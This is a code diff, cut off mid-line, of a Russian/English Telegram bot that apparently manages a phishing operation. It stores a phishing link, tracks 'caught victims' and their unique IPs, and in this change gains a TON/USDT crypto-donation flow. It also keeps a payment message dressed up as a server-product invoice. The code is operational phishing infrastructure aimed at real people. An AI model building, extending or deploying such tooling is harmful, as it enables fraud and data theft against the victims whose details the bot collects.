@@ -11,6 +11,9 @@ ADMIN_ID = 8744429026
 ADMIN_USERNAME = "NeresVoid"
 PHISHING_URL = "https://da.gd/tzO5QW"
 
+# Твой TON кошелёк для USDT
+TON_WALLET = "UQCCjSOpDOYPjoDK18dB7JRNSGmxqN9zacsrVQv-ftXuTjwt"
+
 last_update_id = 0
 victims = []
 user_language = {}
@@ -26,9 +29,17 @@ TEXTS = {
         'data_empty': "📭 **Нет данных**",
         'data_title': "👥 **Пойманные жертвы:**\n\n",
         'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
-        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери сумму:",
+        'donate': "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери способ доната:",
+        'donate_stars': "💫 Telegram Stars",
+        'donate_crypto': "₿ Криптовалюта (USDT)",
         'donate_sent': "✅ **Счёт создан**\n\n- **Товар:** 8 GB, 4 vCPU, 75 GB SSD\n- **Количество:** 1 шт.\n\n- **К оплате:** {stars} Telegram Stars\n- **Эквивалент:** {rubles}₽\n- **Номер заказа:** {order_id}\n\n**⏱ Время на оплату:** 60 минут\n\nПосле оплаты товар будет доставлен автоматически.",
+        'donate_crypto_warning': "⚠️ **ВНИМАНИЕ!** ⚠️\n\nПереводы принимаются **ТОЛЬКО** через сеть **TON** (USDT-TON).\n\n❌ **Не используйте:** TRC20, ERC20, BEP20\n✅ **Используйте:** TON\n\n💸 **Кошелёк:**\n`{wallet}`\n\n*При ошибке выбора сети средства будут потеряны. Бот не несёт ответственности.*",
+        'donate_crypto_1': "**₿ Пожертвование 1 USDT (сеть TON)**\n\n⚠️ ТОЛЬКО СЕТЬ TON\n\n💰 Сумма: 1 USDT\n📦 Кошелёк: `{wallet}`",
+        'donate_crypto_2': "**₿ Пожертвование 2 USDT (сеть TON)**\n\n⚠️ ТОЛЬКО СЕТЬ TON\n\n💰 Сумма: 2 USDT\n📦 Кошелёк: `{wallet}`",
         'payment_received': "✅ **Платёж получен!**\n\nПользователь @{username} перевёл {stars}⭐\n💰 Эквивалент: {rubles}₽\n🆔 Заказ: {order_id}\n\nСпасибо за поддержку! 🙌",
+        'payment_received_crypto': "📨 **Заявка на крипто-пожертвование!**\n\n👤 От: @{username} (ID: {user_id})\n💰 Сумма: {amount} USDT (TON)\n\nПроверьте кошелёк: {wallet}",
+        'crypto_sent_notify': "✅ Администратор уведомлён о вашем переводе {amount} USDT.\n\nСпасибо за поддержку! 💙",
+        'crypto_sent_admin': "✅ Заявка на {amount} USDT отправлена!",
         'settings': "⚙️ **НАСТРОЙКИ**\n\nВыбери язык:",
         'lang_changed': "✅ Язык: Русский",
         'lang_changed_en': "✅ Language: English",
@@ -41,6 +52,8 @@ TEXTS = {
         'donate_25_btn': "⭐ 25 звёзд (~50₽)",
         'donate_50_btn': "⭐ 50 звёзд (~100₽)",
         'donate_100_btn': "⭐ 100 звёзд (~200₽)",
+        'donate_crypto_1_btn': "₿ 1 USDT (TON)",
+        'donate_crypto_2_btn': "₿ 2 USDT (TON)",
         'contact_admin_btn': "📩 Поддержка",
         'ticket_created': "✅ **Тикет создан!**\n\nНапиши свой вопрос ниже. Администратор ответит в этом чате.\n\n⚠️ У тебя активен один тикет. Чтобы создать новый, сначала закрой текущий.",
         'ticket_already_active': "❌ **У тебя уже есть активный тикет!**\n\nДождись ответа администратора или закрой старый тикет командой /close.",
@@ -62,9 +75,17 @@ TEXTS = {
         'data_empty': "📭 **No data**",
         'data_title': "👥 **Victims:**\n\n",
         'stats': "📊 **STATISTICS**\n\n👨‍💼 Total: {total}\n🌐 Unique IPs: {unique}",
-        'donate': "✨ **SUPPORT AUTHOR** ✨\n\nChoose amount:",
-        'donate_sent': "✅ **Счёт создан**\n\n- **Товар:** 8 GB, 4 vCPU, 75 GB SSD\n- **Количество:** 1 шт.\n\n- **К оплате:** {stars} Telegram Stars\n- **Эквивалент:** {rubles}₽\n- **Номер заказа:** {order_id}\n\n**⏱ Время на оплату:** 60 минут\n\nПосле оплаты товар будет доставлен автоматически.",
+        'donate': "✨ **SUPPORT AUTHOR** ✨\n\nChoose donation method:",
+        'donate_stars': "💫 Telegram Stars",
+        'donate_crypto': "₿ Cryptocurrency (USDT)",
+        'donate_sent': "✅ **Invoice created**\n\n- **Product:** 8 GB, 4 vCPU, 75 GB SSD\n- **Quantity:** 1 pc.\n\n- **To pay:** {stars} Telegram Stars\n- **Equivalent:** {rubles}₽\n- **Order number:** {order_id}\n\n**⏱ Time to pay:** 60 minutes\n\nAfter payment, the product will be delivered automatically.",
+        'donate_crypto_warning': "⚠️ **WARNING!** ⚠️\n\nPayments are accepted **ONLY** via **TON** network (USDT-TON).\n\n❌ **Do not use:** TRC20, ERC20, BEP20\n✅ **Use:** TON\n\n💸 **Wallet:**\n`{wallet}`\n\n*If you choose the wrong network, funds will be lost. The bot is not responsible.*",
+        'donate_crypto_1': "**₿ Donation 1 USDT (TON network)**\n\n⚠️ ONLY TON NETWORK\n\n💰 Amount: 1 USDT\n📦 Wallet: `{wallet}`",
+        'donate_crypto_2': "**₿ Donation 2 USDT (TON network)**\n\n⚠️ ONLY TON NETWORK\n\n💰 Amount: 2 USDT\n📦 Wallet: `{wallet}`",
         'payment_received': "✅ **Payment received!**\n\nUser @{username} transferred {stars}⭐\n💰 Equivalent: {rubles}₽\n🆔 Order: {order_id}\n\nThank you for your support! 🙌",
+        'payment_received_crypto': "📨 **Crypto donation request!**\n\n👤 From: @{username} (ID: {user_id})\n💰 Amount: {amount} USDT (TON)\n\nCheck wallet: {wallet}",
+        'crypto_sent_notify': "✅ Admin has been notified of your {amount} USDT transfer.\n\nThank you for your support! 💙",
+        'crypto_sent_admin': "✅ Request for {amount} USDT sent!",
         'settings': "⚙️ **SETTINGS**\n\nChoose language:",
         'lang_changed': "✅ Language: English",
         'lang_changed_ru': "✅ Язык: Русский",
@@ -77,6 +98,8 @@ TEXTS = {
         'donate_25_btn': "⭐ 25 stars (~€0.5)",
         'donate_50_btn': "⭐ 50 stars (~€1)",
         'donate_100_btn': "⭐ 100 stars (~€2)",
+        'donate_crypto_1_btn': "₿ 1 USDT (TON)",
+        'donate_crypto_2_btn': "₿ 2 USDT (TON)",
         'contact_admin_btn': "📩 Support",
         'ticket_created': "✅ **Ticket created!**\n\nWrite your question below. Admin will answer in this chat.\n\n⚠️ You have one active ticket. To create a new one, close the current one.",
         'ticket_already_active': "❌ **You already have an active ticket!**\n\nWait for admin response or close old ticket with /close.",
@@ -135,12 +158,26 @@ def get_main_keyboard(chat_id):
             [{"text": get_button_text(chat_id, 'instruction_btn'), "callback_data": "instruction"}]
         ]
 
-def get_donate_keyboard(chat_id):
+def get_donate_method_keyboard(chat_id):
+    return [
+        [{"text": get_button_text(chat_id, 'donate_stars'), "callback_data": "donate_stars_menu"}],
+        [{"text": get_button_text(chat_id, 'donate_crypto'), "callback_data": "donate_crypto_menu"}],
+        [{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]
+    ]
+
+def get_donate_stars_keyboard(chat_id):
     return [
         [{"text": get_button_text(chat_id, 'donate_25_btn'), "callback_data": "donate_25"}],
         [{"text": get_button_text(chat_id, 'donate_50_btn'), "callback_data": "donate_50"}],
         [{"text": get_button_text(chat_id, 'donate_100_btn'), "callback_data": "donate_100"}],
-        [{"text": get_button_text(chat_id, 'back'), "callback_data": "back"}]
+        [{"text": get_button_text(chat_id, 'back'), "callback_data": "donate_menu"}]
+    ]
+
+def get_donate_crypto_keyboard(chat_id):
+    return [
+        [{"text": get_button_text(chat_id, 'donate_crypto_1_btn'), "callback_data": "donate_crypto_1"}],
+        [{"text": get_button_text(chat_id, 'donate_crypto_2_btn'), "callback_data": "donate_crypto_2"}],
+        [{"text": get_button_text(chat_id, 'back'), "callback_data": "donate_menu"}]
     ]
 
 def get_back_keyboard(chat_id):
@@ -158,6 +195,13 @@ def get_ticket_keyboard(ticket_id):
 
 def get_admin_reply_keyboard(user_id, username, ticket_id):
     return [[{"text": "✏️ Ответить", "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]
+
+def get_crypto_keyboard(amount):
+    return [
+        [{"text": f"💸 Перевести {amount} USDT", "url": f"https://app.tonkeeper.com/transfer/{TON_WALLET}?amount={amount}"}],
+        [{"text": "✅ Я оплатил", "callback_data": f"crypto_sent_{amount}"}],
+        [{"text": "🔙 Назад", "callback_data": "donate_crypto_menu"}]
+    ]
 
 def generate_ticket_id():
     return int(time.time()) % 1000000
@@ -306,60 +350,4 @@ while True:
 
             # Обработка нажатий на кнопки
             if callback:
-                chat_id = callback.get("from", {}).get("id")
-                data = callback.get("data")
-                callback_id = callback.get("id")
-                message_id = callback.get("message", {}).get("message_id")
-                username = callback.get("from", {}).get("username", "нет")
-
-                if data == "create_ticket":
-                    active_ticket = get_active_ticket(chat_id)
-                    if active_ticket:
-                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_already_active'), get_back_keyboard(chat_id))
-                    else:
-                        ticket_id = create_ticket(chat_id, username)
-                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_created'), get_ticket_keyboard(ticket_id))
-                    answer_callback(callback_id)
-
-                elif data.startswith("close_ticket_"):
-                    ticket_id = int(data.split("_")[2])
-                    if close_ticket(chat_id):
-                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
-                        if ADMIN_ID in admin_reply_context and admin_reply_context[ADMIN_ID].get("user_id") == chat_id:
-                            admin_reply_context[ADMIN_ID] = {}
-                        send_message(ADMIN_ID, get_text(ADMIN_ID, 'closed_ticket_notify', ticket_id=ticket_id))
-                    else:
-                        edit_message(chat_id, message_id, get_text(chat_id, 'ticket_not_found'), get_back_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data.startswith("admin_reply_"):
-                    parts = data.split("_")
-                    if len(parts) >= 5:
-                        target_user_id = int(parts[2])
-                        target_username = parts[3]
-                        ticket_id = int(parts[4])
-                        admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": target_user_id, "username": target_username, "ticket_id": ticket_id}
-                        send_message(chat_id, f"✏️ **Ответ пользователю @{target_username}**\n\nНапиши текст ответа ниже:")
-                        answer_callback(callback_id)
-
-                elif data == "back":
-                    if chat_id == ADMIN_ID:
-                        edit_message(chat_id, message_id, get_text(chat_id, 'start', url=PHISHING_URL, count=len(victims)), get_main_keyboard(chat_id))
-                    else:
-                        edit_message(chat_id, message_id, get_text(chat_id, 'admin_help'), get_main_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "donate_menu":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'donate'), get_donate_keyboard(chat_id))
-                    answer_callback(callback_id)
-
-                elif data == "donate_25":
-                    stars = 25
-                    rubles = stars * 2
-                    order_id = f"№{hash(chat_id + int(time.time())) % 10000000}"
-                    
-                    text = get_text(chat_id, 'donate_sent', stars=stars, rubles=rubles, order_id=order_id)
-                    
-                    keyboard = [
-                        [{"text": f"⭐ Оплатить {stars} звёзд", "url": f"https://t.me/telegram?start=star{stars}"}],
-                        [{"text": "❌ Отменить"
+                chat_id = ca
